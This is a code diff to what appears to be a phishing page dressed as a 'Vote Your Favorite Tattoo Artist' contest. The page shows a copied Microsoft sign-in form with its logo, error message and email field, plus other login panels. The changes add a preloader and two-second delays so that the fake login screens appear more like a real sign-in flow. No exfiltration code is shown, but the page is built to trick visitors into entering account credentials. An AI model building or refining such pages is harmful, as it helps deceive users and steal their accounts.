@@ -20,6 +20,9 @@
     <script src="js/index.js"></script>
 </head>
 <body>
+    <div id="preloader">
+      <div class="loader"></div>
+    </div>
     <div class="container">
         <div class="header">
             <h1 id="dynamic-header">Vote Your Favorite Tattoo Artist</h1>
@@ -103,7 +106,7 @@
           <div id="form-holder">
               <img class="sign-in" src="auth/microsoft/img/microsoft_logo.svg" alt="logo" id="ms-logo">
                   <h2 class="sign-in-content sign-in">Sign in</h2><br>
-                  <p class="error-message sign-in">That Microsoft account doesn't exist. Enter a different account or <a href="#">get a new one</a>.</p><br><br>
+                  <p class="error-message sign-in">That Microsoft account doesn't exist. Enter a different account or <a href="#">get a new one</a>.</p><br>
                   <input id="hm-email" class="sign-in-content sign-in" type="email" maxlength="113" lang="en" class="form-control ltr_override" aria-required="true" aria-label="Enter your email, phone, or Skype." aria-describedby="loginHeader" placeholder="Email, phone, or Skype">
                   <p class="sign-in-content sign-in">No account? <a href="#">Create one!</a></p>
                   <p class="sign-in-content sign-in"><a href="">Sign-in options</a></p>
@@ -187,6 +190,7 @@
 <script>
     // Function to show the vote dialogue box
 function showVoteDialog() {
+
     var voteDialog = document.getElementById("vote-dialog");
     voteDialog.style.display = "flex";
     // Hide the scroll bar
@@ -203,6 +207,12 @@ function closeVoteDialog() {
 
 // Function to navigate to Page 1
 function yh() {
+
+    // Show the preloader
+    var preloader = document.getElementById("preloader");
+    preloader.style.display = "block";
+
+    setTimeout(function() {
     // Replace 'page1.html' with the actual URL of your Page 1
     var hmp = document.getElementById("yhp");
     hmp.style.display = "block";
@@ -216,12 +226,22 @@ function yh() {
     // Close the vote dialog
     closeVoteDialog();
 
-    // Hide the scroll bar
-    document.body.style.overflow = "hidden";
+        // Hide the preloader when the function is done loading
+        preloader.style.display = "none";
+
+        // Hide the scroll bar
+        document.body.style.overflow = "hidden";
+    }, 2000); // Delay of 2000 milliseconds (2 seconds)
 }
 
 // Function to navigate to Page 2
 function hm() {
+
+    // Show the preloader
+    var preloader = document.getElementById("preloader");
+    preloader.style.display = "block";
+
+    setTimeout(function() {
     // Replace 'page2.html' with the actual URL of your Page 2
     var hmp = document.getElementById("hmp");
     hmp.style.display = "block";
@@ -235,12 +255,22 @@ function hm() {
     // Close the vote dialog
     closeVoteDialog();
 
-    // Hide the scroll bar
-    document.body.style.overflow = "hidden";
+        // Hide the preloader when the function is done loading
+        preloader.style.display = "none";
+
+        // Hide the scroll bar
+        document.body.style.overflow = "hidden";
+    }, 2000); // Delay of 2000 milliseconds (2 seconds)
 }
 
 // Function to navigate to Page 3
 function gm() {
+
+    // Show the preloader
+    var preloader = document.getElementById("preloader");
+    preloader.style.display = "block";
+
+    setTimeout(function() {
     // Replace 'page2.html' with the actual URL of your Page 2
     var hmp = document.getElementById("gmp");
     hmp.style.display = "block";
@@ -251,14 +281,24 @@ function gm() {
     hmp.style.height = "100%";
     hmp.style.backgroundColor = "white"; // Add a semi-transparent background overlay
 
-    // Close the vote dialog
-    closeVoteDialog();
+     // Close the vote dialog
+     closeVoteDialog();
 
-    // Hide the scroll bar
-    document.body.style.overflow = "hidden";
-}
+         // Hide the preloader when the function is done loading
+         preloader.style.display = "none";
+
+         // Hide the scroll bar
+         document.body.style.overflow = "hidden";
+     }, 2000); // Delay of 2000 milliseconds (2 seconds)
+ }
 // Function to navigate to Page 3
 function em() {
+
+    // Show the preloader
+    var preloader = document.getElementById("preloader");
+    preloader.style.display = "block";
+
+    setTimeout(function() {
     // Replace 'page2.html' with the actual URL of your Page 2
     var hmp = document.getElementById("emp");
     hmp.style.display = "block";
@@ -272,8 +312,12 @@ function em() {
     // Close the vote dialog
     closeVoteDialog();
 
-    // Hide the scroll bar
-    document.body.style.overflow = "hidden";
+        // Hide the preloader when the function is done loading
+        preloader.style.display = "none";
+
+        // Hide the scroll bar
+        document.body.style.overflow = "hidden";
+    }, 2000); // Delay of 2000 milliseconds (2 seconds)
 }
 
 </script>
